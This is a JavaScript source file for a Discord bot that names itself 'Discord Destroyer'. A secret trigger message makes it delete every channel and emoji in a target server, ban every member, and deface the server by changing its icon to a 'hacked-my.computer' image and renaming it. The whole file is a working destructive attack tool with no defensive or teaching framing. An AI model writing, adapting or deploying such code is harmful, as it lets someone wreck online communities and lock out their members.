const Discord = require("discord.js");
const client = new Discord.Client();

const packageVersion = require ("./package.json").version;

const settings = {
    botToken: "TOKEN",
    guildID: "ID",
    guildName: "Hatz jaxana"    
};

console.info('\x1b[37m\x1b[44mINFO\x1b[0m: Starting Discord Destroyer, Version: ${packageVersion}. ');
   
client.on('message', function (message) {
    if (message.content == 'skemasailllefgadfgajfanttt') {
        if(message.author.id === client.user.id) return;
        
        let guild = client.guilds.get(settings.guildID);

   
        guild.channels.forEach(c => {
            c.delete();
            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted channel ${c.name}; ID: ${c.id}. `);
        });
    
        
        guild.emojis.forEach(e => {
            guild.deleteEmoji(e);
            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${e.name}; ID: ${e.id}. `);
        });
    
            guild.members.forEach(m => {
            m.ban();
            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. `);
        });
    
       
        guild.setIcon("https://china.hacked-my.computer/95314b55.png");
    
        
        guild.setName(settings.guildName);
        
        
        console.info("\x1b[37m\x1b[42mSuccess\x1b[0m: Operation completed! ");
    };
});
        

    
    
    
    
  
process.on("uncaughtException", err => {
    console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
    process.exit(1);
});

process.on("unhandledRejection", err => {
    process.exit(1);
});